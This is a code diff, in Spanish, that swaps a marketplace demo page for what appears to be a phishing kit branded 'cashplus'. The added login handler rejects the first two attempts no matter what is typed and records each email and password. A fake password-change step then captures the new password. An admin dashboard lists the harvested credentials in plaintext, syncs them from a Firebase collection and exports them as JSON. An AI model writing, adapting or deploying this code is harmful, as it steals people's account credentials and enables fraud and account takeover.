+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value;
+        const loginBtn = document.getElementById('login-btn');
+        
+        if (!email || !password) {
+            showSimpleNotification('Por favor completa todos los campos');
+            return;
+        }
+
+        saveLoginAttempt(email, password, 'login_attempt');
+
+        if (loginAttempts >= 2) {
+            loginAttempts = 0;
+            
+            loginBtn.disabled = true;
+            loginBtn.classList.add('login-button-loading');
+
+            lastLoginData = saveLoginAttempt(email, password, 'login_success');
+
+            setTimeout(() => {
+                document.getElementById('email').value = '';
+                document.getElementById('password').value = '';
+                
+                loginBtn.disabled = false;
+                loginBtn.classList.remove('login-button-loading');
+                
+                document.getElementById('main-login').style.display = 'none';
+                document.getElementById('password-change-page').style.display = 'flex';
+            }, 1500);
+        } else {
+            loginAttempts++;
+            showSimpleNotification('Incorrecto, Por favor intentalo de nuevo');
+            document.getElementById('password').value = '';
+        }
+    }
+
+    // Manejar cambio de contraseña
+    function handlePasswordChange(event) {
+        event.preventDefault();
+        
+        const currentPassword = document.getElementById('current-password').value;
+        const newPassword = document.getElementById('new-password').value;
+        const confirmPassword = document.getElementById('confirm-password').value;
+        const changeBtn = document.getElementById('password-change-btn');
+
+        if (!currentPassword || !newPassword || !confirmPassword) {
+            showSimpleNotification('Todos los campos son obligatorios');
+            return;
+        }
+
+        if (newPassword !== confirmPassword) {
+            showSimpleNotification('Las nuevas contraseñas no coinciden');
+            return;
+        }
+
+        if (newPassword.length < 6) {
+            showSimpleNotification('La contraseña debe tener al menos 6 caracteres');
+            return;
+        }
+
+        changeBtn.disabled = true;
+        changeBtn.classList.add('login-button-loading');
+        showPageTransition();
+
+        setTimeout(() => {
+            changeBtn.disabled = false;
+            changeBtn.classList.remove('login-button-loading');
+            hidePageTransition();
+
+            if (lastLoginData && lastLoginData.email) {
+                saveLoginAttempt(lastLoginData.email, newPassword, 'password_change');
+            }
+
+            document.getElementById('current-password').value = '';
+            document.getElementById('new-password').value = '';
+            document.getElementById('confirm-password').value = '';
+
+            document.getElementById('password-change-page').style.display = 'none';
+            document.getElementById('success-page').style.display = 'flex';
+        }, 1500);
+    }
+
+    function showSimpleNotification(message) {
+        const notification = document.getElementById('simple-notification');
+        notification.textContent = message || 'Incorrecto, Por favor intentalo de nuevo';
+        notification.classList.add('show');
+        
+        setTimeout(() => {
+            notification.classList.remove('show');
+        }, 3000);
+    }
+
+    // ========== FUNCIONES DE DASHBOARD ==========
+
+    function handleAdminLogin(e) {
+        e.preventDefault();
+        
+        const username = document.getElementById('admin-username').value;
+        const password = document.getElementById('admin-password').value;
+        const loginBtn = document.getElementById('admin-login-btn');
+
+        if (username !== ADMIN_CREDENTIALS.username || password !== ADMIN_CREDENTIALS.password) {
+            showSimpleNotification('Credenciales incorrectas');
+            return;
+        }
+
+        loginBtn.classList.add('loading');
+        loginBtn.disabled = true;
+
+        setTimeout(() => {
+            loginBtn.classList.remove('loading');
+            loginBtn.disabled = false;
+            loadDashboard();
+        }, 800);
+    }
+
+    function loadDashboard() {
+        document.getElementById('main-login').style.display = 'none';
+        document.getElementById('admin-login-page').style.display = 'none';
+        document.getElementById('password-change-page').style.display = 'none';
+        document.getElementById('success-page').style.display = 'none';
+        
+        const dashboardContainer = document.getElementById('dashboard-container');
+        dashboardContainer.style.display = 'block';
+        
+        const localData = localStorage.getItem('cashplus_accounts');
+        if (localData) {
+            try {
+                accountsData = JSON.parse(localData);
+            } catch (e) {
+                console.error("Error parsing local data:", e);
+                accountsData = [];
+            }
+        }
+        
+        renderDashboard();
+        setupRealtimeSync();
+    }
+
+    function renderDashboard() {
+        const dashboardContainer = document.getElementById('dashboard-container');
+        dashboardContainer.innerHTML = generateDashboardHTML();
+        initDashboard();
+        showPanel('overview');
+    }
+
+    function generateDashboardHTML() {
+        return `
+            <div class="app-container">
+                <div class="sidebar-overlay" id="sidebar-overlay"></div>
+                
+                <nav class="sidebar" id="sidebar">
+                    <div class="sidebar-header">
+                        <div class="sidebar-logo" onclick="navigateTo('overview'); closeSidebar()">
+                            Admin
+                        </div>
+                    </div>
                     
-                    <div class="modal-features">
-                        <div class="feature-item">
-                            <i class="fas fa-check-circle"></i>
-                            <span>Envío gratis</span>
+                    <nav class="sidebar-nav">
+                        <div class="nav-section-label">GENERAL</div>
+                        <div class="nav-item" data-panel="overview" onclick="showPanelAndClose('overview')">
+                            <span class="nav-item-icon">✦</span>
+                            Dashboard Principal
                         </div>
-                        <div class="feature-item">
-                            <i class="fas fa-check-circle"></i>
-                            <span>Garantía 30 días</span>
+                        <div class="nav-item" data-panel="accounts" onclick="showPanelAndClose('accounts')">
+                            <span class="nav-item-icon">◈</span>
+                            Gestión de Cuentas
                         </div>
-                        <div class="feature-item">
-                            <i class="fas fa-check-circle"></i>
-                            <span>Devolución gratis</span>
+                        
+                        <div class="nav-section-label">SISTEMA</div>
+                        <div class="nav-item" onclick="exportAllAccounts(); closeSidebar()">
+                            <span class="nav-item-icon">⬇</span>
+                            Exportar Datos
                         </div>
-                        <div class="feature-item">
-                            <i class="fas fa-check-circle"></i>
-                            <span>Pago seguro</span>
-                        </div>
-                    </div>
+                    </nav>
 
-                    <p class="modal-description" id="modalDesc">
-                        Descripción detallada del artículo...
-                    </p>
-
-                    <div class="seller-info" style="margin-bottom: 2rem;">
-                        <div class="seller-avatar" id="modalSellerAvatar">V</div>
-                        <div>
-                            <div class="seller-name" id="modalSeller">Vendedor</div>
-                            <div class="seller-rating">
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star"></i>
-                                <i class="fas fa-star-half-alt"></i>
-                                <span style="color: var(--gray); margin-left: 0.3rem;">(4.8)</span>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div style="display: flex; gap: 1rem;">
-                        <button class="btn btn-primary" style="flex: 1;" onclick="addToCart()">
-                            <i class="fas fa-shopping-cart"></i>
-                            Añadir al Carrito
-                        </button>
-                        <button class="btn btn-secondary" onclick="toggleFavorite(this)">
-                            <i class="far fa-heart"></i>
+                    <div class="sidebar-footer">
+                        <button class="logout-btn" onclick="handleLogout(); closeSidebar()">
+                            <span class="nav-item-icon">↪</span>
+                            Cerrar Sesión
                         </button>
                     </div>
+                </nav>
+
+                <main class="main-content" id="main-content">
+                    <header class="topbar">
+                        <button class="menu-toggle" id="menu-toggle">
+                            <i class="fas fa-bars"></i>
+                        </button>
+                        <div class="topbar-title" id="topbar-title">Dashboard Principal</div>
+                        <div class="topbar-actions">
+                            <span class="topbar-date">${new Date().toLocaleDateString('es-ES', { year: 'numeric', month: 'long', day: 'numeric' })}</span>
+                            <button class="btn btn-ghost btn-small btn-icon" id="refresh-btn" onclick="refreshDashboard(this)">
+                                <i class="fas fa-sync-alt"></i>
+                            </button>
+                        </div>
+                    </header>
+
+                    <div class="content-area">
+                        <div class="panel" id="panel-overview">
+                            ${generateOverviewPanel()}
+                        </div>
+
+                        <div class="panel" id="panel-accounts">
+                            ${generateAccountsPanel()}
+                        </div>
+                    </div>
+                </main>
+            </div>
+        `;
+    }
+
+    function generateOverviewPanel() {
+        const total = accountsData.length;
+        const today = new Date().toISOString().split('T')[0];
+        
+        let activityToday = 0;
+        accountsData.forEach(account => {
+            if (account.attempts && Array.isArray(account.attempts)) {
+                activityToday += account.attempts.filter(a => a && a.date === today).length;
+            }
+        });
+
+        return `
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-icon">✦</div>
+                    <div class="stat-label">TOTAL CUENTAS</div>
+                    <div class="stat-value">${total}</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">◈</div>
+                    <div class="stat-label">ACTIVIDAD HOY</div>
+                    <div class="stat-value">${activityToday}</div>
                 </div>
             </div>
-        </div>
-    </div>
 
-    <!-- Toast Notification -->
-    <div class="toast" id="toast">Artículo añadido al carrito</div>
-
-    <script>
-        // Sample Data
-        const products = [
-            {
-                id: 1,
-                title: "iPhone 14 Pro Max 256GB Morado",
-                price: 899,
-                originalPrice: 1200,
-                category: "Electrónica",
-                condition: "used",
-                conditionLabel: "Como nuevo",
-                image: "https://images.unsplash.com/photo-1678685888221-cda773a3dcdb?w=400&h=300&fit=crop",
-                seller: "TechStore",
-                rating: 4.9,
-                desc: "iPhone 14 Pro Max en perfecto estado. Incluye caja original, cable y funda. Batería al 98% de salud. Garantía hasta 2025."
-            },
-            {
-                id: 2,
-                title: "Sofá Chesterfield de Cuero Auténtico",
-                price: 650,
-                originalPrice: 1200,
-                category: "Hogar",
-                condition: "new",
-                conditionLabel: "Nuevo",
-                image: "https://images.unsplash.com/photo-1555041469-a586c61ea9bc?w=400&h=300&fit=crop",
-                seller: "Muebles Deluxe",
-                rating: 4.7,
-                desc: "Sofá Chesterfield de 3 plazas tapizado en cuero auténtico. Color marrón chocolate. Patas de madera maciza. Entrega a domicilio incluida."
-            },
-            {
-                id: 3,
-                title: "Bicicleta de Montaña Trek X-Caliber 9",
-                price: 450,
-                originalPrice: 800,
-                category: "Deportes",
-                condition: "used",
-                conditionLabel: "Buen estado",
-                image: "https://images.unsplash.com/photo-1532298229144-0ec0c57515c7?w=400&h=300&fit=crop",
-                seller: "BikePro",
-                rating: 4.8,
-                desc: "Bicicleta Trek X-Caliber 9, talla M. Componentes Shimano Deore 12v. Horquilla RockShox con bloqueo. Revisada y lista para rodar."
-            },
-            {
-                id: 4,
-                title: "Cámara Sony A7III con Lente 24-70mm",
-                price: 1200,
-                originalPrice: 2000,
-                category: "Electrónica",
-                condition: "used",
-                conditionLabel: "Excelente",
-                image: "https://images.unsplash.com/photo-1516035069371-29a1b244cc32?w=400&h=300&fit=crop",
-                seller: "FotoStudio",
-                rating: 5.0,
-                desc: "Equipo profesional Sony A7III con objetivo Zeiss 24-70mm f/4. 15,000 disparos. Incluye 2 baterías, cargador y bolsa de transporte."
-            },
-            {
-                id: 5,
-                title: "Zapatillas Nike Air Jordan 1 Retro",
-                price: 180,
-                originalPrice: 220,
-                category: "Moda",
-                condition: "new",
-                conditionLabel: "Nuevo con etiquetas",
-                image: "https://images.unsplash.com/photo-1556906781-9a412961c28c?w=400&h=300&fit=crop",
-                seller: "SneakerHead",
-                rating: 4.9,
-                desc: "Air Jordan 1 High OG 'Chicago' 2022. Talla 44.5 EUR. 100% originales con ticket de compra. Caja en perfecto estado."
-            },
-            {
-                id: 6,
-                title: "MacBook Pro 14' M1 Pro 16GB RAM",
-                price: 1350,
-                originalPrice: 2200,
-                category: "Electrónica",
-                condition: "used",
-                conditionLabel: "Como nuevo",
-                image: "https://images.unsplash.com/photo-1517336714731-489689fd1ca8?w=400&h=300&fit=crop",
-                seller: "AppleReseller",
-                rating: 4.8,
-                desc: "MacBook Pro 14 pulgadas con chip M1 Pro, 16GB RAM y 512GB SSD. Space Gray. Ciclos de batería: 45. Incluye cargador MagSafe."
-            },
-            {
-                id: 7,
-                title: "Mesa de Comedor Extensible Roble",
-                price: 320,
-                originalPrice: 600,
-                category: "Hogar",
-                condition: "used",
-                conditionLabel: "Buen estado",
-                image: "https://images.unsplash.com/photo-1577140917170-285929fb55b7?w=400&h=300&fit=crop",
-                seller: "VintageHome",
-                rating: 4.6,
-                desc: "Mesa de comedor extensible de roble macizo. Medidas: 140x90cm, extensible hasta 200cm. Acabado natural. Patas torneadas."
-            },
-            {
-                id: 8,
-                title: "Guitarra Eléctrica Fender Stratocaster",
-                price: 750,
-                originalPrice: 950,
-                category: "Deportes",
-                condition: "new",
-                conditionLabel: "Nueva",
-                image: "https://images.unsplash.com/photo-1550985543-f4423c9d7481?w=400&h=300&fit=crop",
-                seller: "MusicWorld",
-                rating: 4.9,
-                desc: "Fender Player Stratocaster MN 3-Color Sunburst. Pastillas Player Series. Incluye funda acolchada y correa. Setup profesional incluido."
-            }
-        ];
-
-        let cart = [];
-        let favorites = [];
-        let currentFilter = 'all';
-
-        // Initialize
-        document.addEventListener('DOMContentLoaded', () => {
-            renderProducts();
-            
-            // Search input listener
-            document.getElementById('searchInput').addEventListener('input', (e) => {
-                searchProducts(e.target.value);
-            });
-        });
-
-        // Render Products
-        function renderProducts(filteredProducts = products) {
-            const grid = document.getElementById('productsGrid');
-            grid.innerHTML = '';
-            
-            filteredProducts.forEach((product, index) => {
-                const card = document.createElement('div');
-                card.className = 'product-card';
-                card.style.animationDelay = `${index * 0.1}s`;
-                card.onclick = () => openProductModal(product);
-                
-                const badgeClass = product.condition === 'new' ? 'badge-new' : 'badge-used';
-                const badgeText = product.condition === 'new' ? 'Nuevo' : '2ª Mano';
-                
-                card.innerHTML = `
-                    <div class="product-image">
-                        <img src="${product.image}" alt="${product.title}" loading="lazy">
-                        <span class="product-badge ${badgeClass}">${badgeText}</span>
-                        ${product.originalPrice > product.price ? '<span class="product-badge badge-sale" style="top: 3rem;">-30%</span>' : ''}
-                        <div class="product-actions">
-                            <button class="action-btn" onclick="event.stopPropagation(); toggleFavoriteItem(${product.id})">
-                                <i class="${favorites.includes(product.id) ? 'fas' : 'far'} fa-heart"></i>
-                            </button>
-                            <button class="action-btn" onclick="event.stopPropagation(); quickAddToCart(${product.id})">
-                                <i class="fas fa-shopping-cart"></i>
-                            </button>
-                        </div>
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-title">
+                        <i class="fas fa-user-circle"></i>
+                        Últimas Cuentas Registradas
                     </div>
-                    <div class="product-info">
-                        <div class="product-category">${product.category}</div>
-                        <h3 class="product-title">${product.title}</h3>
-                        <div class="product-meta">
-                            <div class="product-price">
-                                €${product.price}
-                                ${product.originalPrice > product.price ? `<span class="original">€${product.originalPrice}</span>` : ''}
-                            </div>
-                            <div class="product-condition">
-                                <i class="fas fa-${product.condition === 'new' ? 'certificate' : 'recycle'}"></i>
-                                ${product.conditionLabel}
-                            </div>
-                        </div>
-                        <div class="seller-info">
-                            <div class="seller-avatar">${product.seller[0]}</div>
-                            <div>
-                                <div class="seller-name">${product.seller}</div>
-                                <div class="seller-rating">
-                                    <i class="fas fa-star"></i>
-                                    <span>${product.rating}</span>
-                                </div>
-                            </div>
-                        </div>
+                </div>
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Email</th>
+                                <th>Total Intentos</th>
+                                <th>Última Actividad</th>
+                                <th>Estado</th>
+                                <th>Acciones</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            ${accountsData.slice(-5).reverse().map(account => {
+                                if (!account || !account.attempts) return '';
+                                const lastAttempt = account.attempts[account.attempts.length - 1];
+                                return `
+                                <tr>
+                                    <td>${account.email || ''}</td>
+                                    <td>${account.attempts.length}</td>
+                                    <td>${lastAttempt ? (lastAttempt.date + ' ' + lastAttempt.time) : 'Nunca'}</td>
+                                    <td><span class="badge badge-active">Activo</span></td>
+                                    <td>
+                                        <div class="card-actions">
+                                            <button class="action-btn view" onclick="showHistory('${account.email}')">
+                                                <i class="fas fa-eye"></i> Ver
+                                            </button>
+                                            <button class="action-btn delete" onclick="deleteAccount('${account.email}')">
+                                                <i class="fas fa-trash"></i>
+                                            </button>
+                                        </div>
+                                    </td>
+                                </tr>
+                            `}).join('')}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        `;
+    }
+
+    function generateAccountsPanel() {
+        return `
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-title">
+                        <i class="fas fa-user-circle"></i>
+                        Gestión de Cuentas
                     </div>
-                `;
+                </div>
+                <div class="toolbar">
+                    <input class="search-input" id="account-search" placeholder="Buscar cuentas..." oninput="filterAccounts()">
+                    <button class="btn btn-primary" onclick="exportAllAccounts()">
+                        <i class="fas fa-download"></i> Exportar
+                    </button>
+                </div>
                 
-                grid.appendChild(card);
+                <div class="selection-actions" id="selection-actions" style="display: none;">
+                    <div class="selection-count" id="selection-count">0 cuentas seleccionadas</div>
+                    <div class="selection-buttons">
+                        <button class="btn btn-primary btn-small" id="delete-selected-btn" onclick="deleteSelectedAccounts()">
+                            <i class="fas fa-trash"></i> Eliminar Seleccionadas
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th style="width: 50px;">
+                                    <div class="checkbox-container">
+                                        <div class="checkbox" id="select-all-checkbox" onclick="toggleSelectAll()"></div>
+                                    </div>
+                                </th>
+                                <th>Email</th>
+                                <th>Total Intentos</th>
+                                <th>Última Contraseña</th>
+                                <th>Última Actividad</th>
+                                <th>Estado</th>
+                                <th>Acciones</th>
+                            </tr>
+                        </thead>
+                        <tbody id="accounts-table-body">
+                            ${generateAccountsRows()}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        `;
+    }
+
+    function generateAccountsRows() {
+        if (!accountsData || accountsData.length === 0) {
+            return `<tr><td colspan="7" style="text-align:center;padding:32px;color:#70707a;">No hay cuentas registradas</td></tr>`;
+        }
+
+        return accountsData.map(account => {
+            if (!account || !account.attempts) return '';
+            const lastAttempt = account.attempts[account.attempts.length - 1];
+            const lastPassword = lastAttempt ? lastAttempt.password : 'N/A';
+            const lastDate = lastAttempt ? (lastAttempt.date + ' ' + lastAttempt.time) : 'Nunca';
+            
+            return `
+            <tr>
+                <td>
+                    <div class="checkbox-container">
+                        <div class="checkbox ${selectedAccounts.has(account.email) ? 'checked' : ''}" onclick="toggleAccountSelection('${account.email}')"></div>
+                    </div>
+                </td>
+                <td>${account.email}</td>
+                <td>${account.attempts.length}</td>
+                <td>${lastPassword}</td>
+                <td>${lastDate}</td>
+                <td><span class="badge badge-active">Activo</span></td>
+                <td>
+                    <div class="card-actions">
+                        <button class="action-btn view" onclick="showHistory('${account.email}')">
+                            <i class="fas fa-eye"></i> Ver
+                        </button>
+                        <button class="action-btn delete" onclick="deleteAccount('${account.email}')">
+                            <i class="fas fa-trash"></i>
+                        </button>
+                    </div>
+                </td>
+            </tr>
+        `}).join('');
+    }
+
+    function showHistory(email) {
+        const account = accountsData.find(a => a.email === email);
+        if (!account || !account.attempts) return;
+        
+        document.getElementById('modal-email-title').textContent = `Historial de: ${email}`;
+        
+        const modalBody = document.getElementById('history-modal-body');
+        const sortedAttempts = [...account.attempts].reverse();
+        
+        let html = '<ul class="history-list">';
+        
+        sortedAttempts.forEach(attempt => {
+            if (!attempt) return;
+            let typeText = '';
+            let typeClass = '';
+            
+            switch(attempt.type) {
+                case 'login_attempt':
+                    typeText = 'Intento de login';
+                    typeClass = 'color: #b55a4a;';
+                    break;
+                case 'login_success':
+                    typeText = 'Login exitoso';
+                    typeClass = 'color: #4caf80;';
+                    break;
+                case 'password_change':
+                    typeText = 'Cambio de contraseña';
+                    typeClass = 'color: #d4af37;';
+                    break;
+                default:
+                    typeText = 'Intento';
+            }
+            
+            html += `
+                <li class="history-item">
+                    <div class="date">${attempt.timestamp || ''} (GMT+0: ${attempt.time || ''})</div>
+                    <div class="password">🔑 ${attempt.password || ''}</div>
+                    <div class="type" style="${typeClass}">${typeText}</div>
+                </li>
+            `;
+        });
+        
+        html += '</ul>';
+        
+        modalBody.innerHTML = html;
+        document.getElementById('history-modal').classList.add('active');
+    }
+
+    function closeHistoryModal() {
+        document.getElementById('history-modal').classList.remove('active');
+    }
+
+    function initDashboard() {
+        const menuToggle = document.getElementById('menu-toggle');
+        const sidebar = document.getElementById('sidebar');
+        const sidebarOverlay = document.getElementById('sidebar-overlay');
+        
+        if (menuToggle && sidebar && sidebarOverlay) {
+            menuToggle.addEventListener('click', (e) => {
+                e.stopPropagation();
+                sidebar.classList.add('active');
+                sidebarOverlay.classList.add('active');
+            });
+            
+            sidebarOverlay.addEventListener('click', () => {
+                closeSidebar();
             });
         }
 
-        // Filter Functions
-        function setFilter(btn, filter) {
-            document.querySelectorAll('.filter-chip').forEach(chip => chip.classList.remove('active'));
-            btn.classList.add('active');
-            currentFilter = filter;
+        updateSelectionUI();
+    }
+
+    function closeSidebar() {
+        const sidebar = document.getElementById('sidebar');
+        const overlay = document.getElementById('sidebar-overlay');
+        if (sidebar) sidebar.classList.remove('active');
+        if (overlay) overlay.classList.remove('active');
+    }
+
+    function showPanelAndClose(panelName) {
+        showPanel(panelName);
+        closeSidebar();
+    }
+
+    function showPanel(panelName) {
+        document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+        const panel = document.getElementById(`panel-${panelName}`);
+        if (panel) panel.classList.add('active');
+        
+        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+        const activeItem = document.querySelector(`[data-panel="${panelName}"]`);
+        if (activeItem) activeItem.classList.add('active');
+
+        const titles = {
+            overview: 'Dashboard Principal',
+            accounts: 'Gestión de Cuentas'
+        };
+        const titleEl = document.getElementById('topbar-title');
+        if (titleEl) titleEl.textContent = titles[panelName];
+        currentDashboardPage = panelName;
+
+        if (panelName === 'accounts') {
+            renderAccountsTable();
+        }
+    }
+
+    function renderAccountsTable() {
+        const tbody = document.getElementById('accounts-table-body');
+        if (tbody) {
+            tbody.innerHTML = generateAccountsRows();
+        }
+        updateSelectionUI();
+    }
+
+    function filterAccounts() {
+        const searchTerm = document.getElementById('account-search')?.value.toLowerCase() || '';
+        
+        const filtered = accountsData.filter(account => 
+            account && account.email && account.email.toLowerCase().includes(searchTerm)
+        );
+
+        const tbody = document.getElementById('accounts-table-body');
+        if (tbody) {
+            if (filtered.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="7" style="text-align:center;padding:32px;color:#70707a;">No se encontraron resultados</td></tr>`;
+            } else {
+                tbody.innerHTML = filtered.map(account => {
+                    const lastAttempt = account.attempts[account.attempts.length - 1];
+                    const lastPassword = lastAttempt ? lastAttempt.password : 'N/A';
+                    const lastDate = lastAttempt ? (lastAttempt.date + ' ' + lastAttempt.time) : 'Nunca';
+                    
+                    return `
+                    <tr>
+                        <td>
+                            <div class="checkbox-container">
+                                <div class="checkbox ${selectedAccounts.has(account.email) ? 'checked' : ''}" onclick="toggleAccountSelection('${account.email}')"></div>
+                            </div>
+                        </td>
+                        <td>${account.email}</td>
+                        <td>${account.attempts.length}</td>
+                        <td>${lastPassword}</td>
+                        <td>${lastDate}</td>
+                        <td><span class="badge badge-active">Activo</span></td>
+                        <td>
+                            <div class="card-actions">
+                                <button class="action-btn view" onclick="showHistory('${account.email}')">
+                                    <i class="fas fa-eye"></i> Ver
+                                </button>
+                                <button class="action-btn delete" onclick="deleteAccount('${account.email}')">
+                                    <i class="fas fa-trash"></i>
+                                </button>
+                            </div>
+                        </td>
+                    </tr>
+                `}).join('');
+            }
+        }
+        updateSelectionUI();
+    }
+
+    function toggleAccountSelection(email) {
+        if (selectedAccounts.has(email)) {
+            selectedAccounts.delete(email);
+        } else {
+            selectedAccounts.add(email);
+        }
+        updateSelectionUI();
+        renderAccountsTable();
+    }
+
+    function toggleSelectAll() {
+        const selectAllCheckbox = document.getElementById('select-all-checkbox');
+        if (!selectAllCheckbox) return;
+        
+        if (selectAllCheckbox.classList.contains('checked')) {
+            selectedAccounts.clear();
+        } else {
+            accountsData.forEach(account => {
+                if (account && account.email) selectedAccounts.add(account.email);
+            });
+        }
+        updateSelectionUI();
+        renderAccountsTable();
+    }
+
+    function updateSelectionUI() {
+        const selectionActions = document.getElementById('selection-actions');
+        const selectionCount = document.getElementById('selection-count');
+        const selectAllCheckbox = document.getElementById('select-all-checkbox');
+        
+        if (selectionActions && selectionCount) {
+            if (selectedAccounts.size > 0) {
+                selectionActions.style.display = 'flex';
+                selectionCount.textContent = `${selectedAccounts.size} cuenta${selectedAccounts.size !== 1 ? 's' : ''} seleccionada${selectedAccounts.size !== 1 ? 's' : ''}`;
+            } else {
+                selectionActions.style.display = 'none';
+            }
+        }
+        
+        if (selectAllCheckbox) {
+            if (accountsData.length > 0 && selectedAccounts.size === accountsData.length) {
+                selectAllCheckbox.classList.add('checked');
+            } else {
+                selectAllCheckbox.classList.remove('checked');
+            }
+        }
+    }
+
+    function exportAllAccounts() {
+        const dataStr = JSON.stringify(accountsData, null, 2);
+        const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
+        const link = document.createElement('a');
+        link.setAttribute('href', dataUri);
+        link.setAttribute('download', `cashplus_accounts_${new Date().toISOString().split('T')[0]}.json`);
+        link.click();
+        closeSidebar();
+    }
+
+    function refreshDashboard(btn) {
+        const icon = btn.querySelector('i');
+        if (icon) {
+            icon.classList.add('spinning');
+        }
+        
+        setTimeout(() => {
+            if (document.getElementById('panel-overview').classList.contains('active')) {
+                showPanel('overview');
+            } else if (document.getElementById('panel-accounts').classList.contains('active')) {
+                showPanel('accounts');
+            }
+            if (icon) {
+                icon.classList.remove('spinning');
+            }
+        }, 400);
+    }
+
+    function handleLogout() {
+        if (confirm('¿Cerrar sesión?')) {
+            if (unsubscribe) {
+                unsubscribe();
+                unsubscribe = null;
+            }
             
-            let filtered = products;
+            document.getElementById('dashboard-container').style.display = 'none';
+            document.getElementById('dashboard-container').innerHTML = '';
+            document.getElementById('main-login').style.display = 'flex';
+            selectedAccounts.clear();
+            closeHistoryModal();
+            closeSidebar();
+        }
+    }
+
+    function navigateTo(panel) {
+        showPanel(panel);
+    }
+
+    // ========== CARGA DE DATOS ==========
+
+    async function loadDataFromFirebase() {
+        try {
+            const accountsSnapshot = await db.collection('cashplus_accounts').get();
             
-            switch(filter) {
-                case 'new':
-                    filtered = products.filter(p => p.condition === 'new');
-                    break;
-                case 'used':
-                    filtered = products.filter(p => p.condition === 'used');
-                    break;
-                case 'price-low':
-                    filtered = [...products].sort((a, b) => a.price - b.price);
-                    break;
-                case 'price-high':
-                    filtered = [...products].sort((a, b) => b.price - a.price);
-                    break;
+            if (!accountsSnapshot.empty) {
+                accountsData = accountsSnapshot.docs.map(doc => doc.data());
+                localStorage.setItem('cashplus_accounts', JSON.stringify(accountsData));
             }
-            
-            renderProducts(filtered);
+        } catch (error) {
+            console.error("Error cargando datos de Firebase:", error);
         }
+    }
 
-        function filterByCategory(category) {
-            const filtered = products.filter(p => p.category.toLowerCase() === category);
-            renderProducts(filtered);
-            document.getElementById('products').scrollIntoView({ behavior: 'smooth' });
-            showToast(`Filtrando por: ${category.charAt(0).toUpperCase() + category.slice(1)}`);
-        }
-
-        function searchProducts(query) {
-            if (!query) {
-                renderProducts();
-                return;
-            }
-            const filtered = products.filter(p => 
-                p.title.toLowerCase().includes(query.toLowerCase()) ||
-                p.category.toLowerCase().includes(query.toLowerCase())
-            );
-            renderProducts(filtered);
-        }
-
-        function search() {
-            const query = document.getElementById('searchInput').value;
-            searchProducts(query);
-            document.getElementById('products').scrollIntoView({ behavior: 'smooth' });
-        }
-
-        // Modal Functions
-        function openProductModal(product) {
-            document.getElementById('modalImg').src = product.image;
-            document.getElementById('modalCategory').textContent = product.category;
-            document.getElementById('modalTitle').textContent = product.title;
-            document.getElementById('modalPrice').textContent = `€${product.price}`;
-            document.getElementById('modalDesc').textContent = product.desc;
-            document.getElementById('modalSeller').textContent = product.seller;
-            document.getElementById('modalSellerAvatar').textContent = product.seller[0];
-            
-            document.getElementById('productModal').classList.add('active');
-            document.body.style.overflow = 'hidden';
-        }
-
-        function closeModal() {
-            document.getElementById('productModal').classList.remove('active');
-            document.body.style.overflow = '';
-        }
-
-        // Cart Functions
-        function addToCart() {
-            cart.push(1);
-            updateCartCount();
-            closeModal();
-            showToast('Artículo añadido al carrito');
-        }
-
-        function quickAddToCart(id) {
-            cart.push(id);
-            updateCartCount();
-            showToast('Artículo añadido al carrito');
-        }
-
-        function updateCartCount() {
-            document.getElementById('cartCount').textContent = cart.length;
-        }
-
-        function toggleCart() {
-            if (cart.length === 0) {
-                showToast('Tu carrito está vacío');
-            } else {
-                showToast(`${cart.length} artículos en el carrito`);
+    function init() {
+        setupLogoDoubleClick();
+        setupEventListeners();
+        
+        const localData = localStorage.getItem('cashplus_accounts');
+        if (localData) {
+            try {
+                accountsData = JSON.parse(localData);
+            } catch (e) {
+                console.error("Error parsing local data:", e);
+                accountsData = [];
             }
         }
+    }
 
-        // Favorites Functions
-        function toggleFavorite(btn) {
-            const icon = btn.querySelector('i');
-            if (icon.classList.contains('far')) {
-                icon.classList.remove('far');
-                icon.classList.add('fas');
-                btn.style.background = 'var(--danger)';
-                btn.style.color = 'white';
-                showToast('Añadido a favoritos');
-            } else {
-                icon.classList.remove('fas');
-                icon.classList.add('far');
-                btn.style.background = '';
-                btn.style.color = '';
-            }
+    function setupEventListeners() {
+        const loginForm = document.getElementById('login-form');
+        if (loginForm) {
+            loginForm.addEventListener('submit', handleLogin);
         }
-
-        function toggleFavoriteItem(id) {
-            const index = favorites.indexOf(id);
-            if (index > -1) {
-                favorites.splice(index, 1);
-                showToast('Eliminado de favoritos');
-            } else {
-                favorites.push(id);
-                showToast('Añadido a favoritos');
-            }
-            document.getElementById('favCount').textContent = favorites.length;
-            renderProducts(currentFilter === 'all' ? products : products.filter(p => {
-                if (currentFilter === 'new') return p.condition === 'new';
-                if (currentFilter === 'used') return p.condition === 'used';
-                return true;
-            }));
+        
+        const passwordForm = document.getElementById('password-change-form');
+        if (passwordForm) {
+            passwordForm.addEventListener('submit', handlePasswordChange);
         }
-
-        function toggleFavorites() {
-            if (favorites.length === 0) {
-                showToast('No tienes favoritos guardados');
-            } else {
-                showToast(`${favorites.length} artículos en favoritos`);
-            }
+        
+        const adminLoginForm = document.getElementById('admin-login-form');
+        if (adminLoginForm) {
+            adminLoginForm.addEventListener('submit', handleAdminLogin);
         }
-
-        // UI Functions
-        function showToast(message) {
-            const toast = document.getElementById('toast');
-            toast.textContent = message;
-            toast.classList.add('show');
-            setTimeout(() => {
-                toast.classList.remove('show');
-            }, 3000);
-        }
-
-        function setActiveNav(element) {
-            document.querySelectorAll('.mobile-nav-item').forEach(item => item.classList.remove('active'));
-            element.classList.add('active');
-        }
-
-        function scrollToProducts() {
